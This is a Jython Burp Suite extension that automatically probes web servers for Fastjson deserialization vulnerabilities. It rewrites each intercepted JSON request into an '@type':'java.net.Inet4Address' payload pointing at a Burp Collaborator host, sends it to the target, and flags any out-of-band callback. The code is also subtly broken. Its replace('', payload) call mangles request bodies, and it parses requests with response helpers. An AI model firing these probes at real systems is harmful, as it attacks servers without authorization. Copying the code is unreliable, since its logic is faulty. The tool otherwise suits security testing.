from burp import IBurpExtender
from burp import ITab
from burp import IHttpListener
from burp import IMessageEditorController
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IContextMenuFactory
import re
from java.awt import Component;
from java.io import PrintWriter;
from java.util import ArrayList;
from java.util import List;
from javax.swing import JScrollPane;
from javax.swing import JSplitPane;
from javax.swing import JTabbedPane;
from javax.swing import JTable;
from javax.swing import SwingUtilities;
from javax.swing.table import AbstractTableModel;
from threading import Lock
import json

print """Fastjson By:lunlun"""

black_ext = ('.jpg','.js','.css','.ico','.gif','.swf','woff','.png','.jpeg','.woff2','.svg','.mp4','.flv')
black_ext_list = ('.jpg?','.js?','.css?','.ico?','.gif?','.swf?','.woff?','.png?','.jpeg?','.woff2?')
black_host = ('.wyzxxz.com','.aliyuncs.com','.alicdn.com')

class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel):
    
    #
    # implement IBurpExtender
    #
    
    def	registerExtenderCallbacks(self, callbacks):

        self._callbacks = callbacks
        
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("fastjson")

        self.collaboratorContext = callbacks.createBurpCollaboratorClientContext()
        self.payload = self.collaboratorContext.generatePayload(True)

        print str(self.payload)
        
        # create the log and a lock on which to synchronize when adding log entries
        self._log = ArrayList()
        self._lock = Lock()
        
        # main split pane
        self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        
        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)
        print scrollPane
        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        self._requestViewer = callbacks.createMessageEditor(self, False)
        self._responseViewer = callbacks.createMessageEditor(self, False)
        tabs.addTab("Request", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        self._splitpane.setRightComponent(tabs)
        
        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        callbacks.customizeUiComponent(logTable)
        callbacks.customizeUiComponent(scrollPane)
        callbacks.customizeUiComponent(tabs)
        
        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
        
        return
        
    #
    # implement ITab
    #
    
    def getTabCaption(self):
        return "FastjsonScan"
    
    def getUiComponent(self):
        return self._splitpane
        
    #
    # implement IHttpListener
    #

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # only process requests
        if toolFlag == 64 or toolFlag == 16 or toolFlag == 8 or toolFlag == 4:
            if not messageIsRequest:
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(response)
                response_headers = analyzedResponse.getHeaders()
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_StatusCode = analyzedResponse.getStatusCode()

                resquest = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeResponse(resquest)
                request_header = analyzedRequest.getHeaders()
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()

                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()

                re_cc=re.compile(r'GET(.+)HTTP/1.1|POST(.+)HTTP/1.1')
                cc_re=re.findall(re_cc,request_header[0])
                for url in cc_re:
                    if str(url).strip().endswith(black_ext) or host.endswith(black_host) or any(x in str(url).strip() for x in black_ext_list):
                        pass
                    else:
                        request_bodyso=request_bodys
                        try:
                            if json.loads(request_bodyso):
                                request_bodyss=request_bodyso.replace("",'{"name":{"@type":"java.net.Inet4Address","val":"'+str(self.payload).strip()+'"}}')
                                req = self._helpers.buildHttpMessage(request_header, request_bodyss)
                                ishttps = False
                                if port == 443:
                                    ishttps = True
                                rep = self._callbacks.makeHttpRequest(host, port, ishttps, req)
                                analyzedreq = self._helpers.analyzeResponse(rep)
                                req_headers = analyzedreq.getHeaders()
                                req_bodys = req[analyzedreq.getBodyOffset():].tostring()
                                if self.collaboratorContext.fetchAllCollaboratorInteractions():
                                    print "Fastjson"
                                    messageInfo.setHighlight('red')
                                    # create a new log entry with the message details
                                    self._lock.acquire()
                                    row = self._log.size()
                                    self._log.add(LogEntry(toolFlag, self._callbacks.saveBuffersToTempFiles(messageInfo), self._helpers.analyzeRequest(messageInfo).getUrl()))
                                    self.fireTableRowsInserted(row, row)
                                    self._lock.release()

                        except:
                            pass

    #
    # extend AbstractTableModel
    #
    
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 2

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "Tool"
        if columnIndex == 1:
            return "URL"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return self._callbacks.getToolName(logEntry._tool)
        if columnIndex == 1:
            return logEntry._url.toString()
        return ""

    #
    # implement IMessageEditorController
    # this allows our request/response viewers to obtain details about the messages being displayed
    #
    
    def getHttpService(self):
        return self._currentlyDisplayedItem.getHttpService()

    def getRequest(self):
        return self._currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return self._currentlyDisplayedItem.getResponse()

#
# extend JTable to handle cell selection
#
    
class Table(JTable):
    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
    
    def changeSelection(self, row, col, toggle, extend):
    
        # show the log entry for the selected row
        logEntry = self._extender._log.get(row)
        self._extender._requestViewer.setMessage(logEntry._requestResponse.getRequest(), True)
        self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
        self._extender._currentlyDisplayedItem = logEntry._requestResponse
        
        JTable.changeSelection(self, row, col, toggle, extend)
    
#
# class to hold details of each log entry
#

class LogEntry:
    def __init__(self, tool, requestResponse, url):
        self._tool = tool
        self._requestResponse = requestResponse
        self._url = url
